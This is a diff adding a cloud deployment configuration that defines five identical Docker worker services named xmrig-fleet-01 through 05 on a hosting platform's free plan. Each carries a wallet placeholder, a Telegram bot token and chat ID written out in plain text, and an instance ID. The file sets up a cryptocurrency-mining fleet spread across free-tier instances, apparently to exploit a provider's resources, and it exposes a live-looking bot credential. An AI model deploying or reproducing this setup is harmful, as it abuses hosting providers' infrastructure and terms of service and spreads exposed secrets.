@@ -1,0 +1,75 @@
+services:
+  - type: worker
+    name: xmrig-fleet-01
+    runtime: docker
+    dockerfilePath: ./Dockerfile
+    plan: free
+    envVars:
+      - key: BTC_WALLET
+        value: WALLET_PLACEHOLDER
+      - key: TELEGRAM_TOKEN
+        value: 8679655550:AAGUB1m5fmqHc8OHqqM24Vixz8FfwX-gqD4
+      - key: TELEGRAM_CHAT_ID
+        value: "7135054241"
+      - key: RENDER_INSTANCE_ID
+        value: "fleet-01"
+
+  - type: worker
+    name: xmrig-fleet-02
+    runtime: docker
+    dockerfilePath: ./Dockerfile
+    plan: free
+    envVars:
+      - key: BTC_WALLET
+        value: WALLET_PLACEHOLDER
+      - key: TELEGRAM_TOKEN
+        value: 8679655550:AAGUB1m5fmqHc8OHqqM24Vixz8FfwX-gqD4
+      - key: TELEGRAM_CHAT_ID
+        value: "7135054241"
+      - key: RENDER_INSTANCE_ID
+        value: "fleet-02"
+
+  - type: worker
+    name: xmrig-fleet-03
+    runtime: docker
+    dockerfilePath: ./Dockerfile
+    plan: free
+    envVars:
+      - key: BTC_WALLET
+        value: WALLET_PLACEHOLDER
+      - key: TELEGRAM_TOKEN
+        value: 8679655550:AAGUB1m5fmqHc8OHqqM24Vixz8FfwX-gqD4
+      - key: TELEGRAM_CHAT_ID
+        value: "7135054241"
+      - key: RENDER_INSTANCE_ID
+        value: "fleet-03"
+
+  - type: worker
+    name: xmrig-fleet-04
+    runtime: docker
+    dockerfilePath: ./Dockerfile
+    plan: free
+    envVars:
+      - key: BTC_WALLET
+        value: WALLET_PLACEHOLDER
+      - key: TELEGRAM_TOKEN
+        value: 8679655550:AAGUB1m5fmqHc8OHqqM24Vixz8FfwX-gqD4
+      - key: TELEGRAM_CHAT_ID
+        value: "7135054241"
+      - key: RENDER_INSTANCE_ID
+        value: "fleet-04"
+
+  - type: worker
+    name: xmrig-fleet-05
+    runtime: docker
+    dockerfilePath: ./Dockerfile
+    plan: free
+    envVars:
+      - key: BTC_WALLET
+        value: WALLET_PLACEHOLDER
+      - key: TELEGRAM_TOKEN
+        value: 8679655550:AAGUB1m5fmqHc8OHqqM24Vixz8FfwX-gqD4
+      - key: TELEGRAM_CHAT_ID
+        value: "7135054241"
+      - key: RENDER_INSTANCE_ID
+        value: "fleet-05"
